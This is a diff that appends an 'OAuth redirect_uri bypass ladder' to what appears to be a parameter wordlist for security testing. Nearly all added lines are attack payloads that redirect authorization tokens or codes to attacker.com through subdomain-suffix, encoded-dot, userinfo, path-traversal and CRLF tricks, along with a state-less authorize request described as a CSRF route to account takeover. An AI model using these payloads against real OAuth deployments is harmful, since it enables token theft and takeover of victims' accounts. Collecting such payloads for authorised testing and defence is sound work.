@@ -21,3 +21,19 @@ response_type=token
 scope=openid
 scope=read
 state=abc123
+# ─── OAuth redirect_uri bypass ladder (skraft9/vulnerability-research) ───
+# subdomain-suffix: attacker.client.com if allowlist is prefix-match
+?redirect_uri=https://client.com.attacker.com/cb
+# chained open-redirect on the client's own domain:
+?redirect_uri=https://client.com/redirect?to=https://attacker.com/cb
+# URL-encoded dot (bypasses .com literal check):
+?redirect_uri=https://client.com%2Eattacker.com/cb
+# credentials-syntax (browsers strip user, backend allow-lists on 'client.com'):
+?redirect_uri=https://client.com@attacker.com/cb
+# path-append (allowlist checks only origin):
+?redirect_uri=https://client.com/x/../../@attacker.com/cb
+# null-byte or CRLF split:
+?redirect_uri=https://client.com%0d%0aLocation:%20https://attacker.com/cb
+# missing state → CSRF pre-account-takeover:
+GET /oauth/authorize?client_id=X&redirect_uri=https://client.com/cb&response_type=code
+# — omit state entirely; if server accepts, replay any code back into victim's session
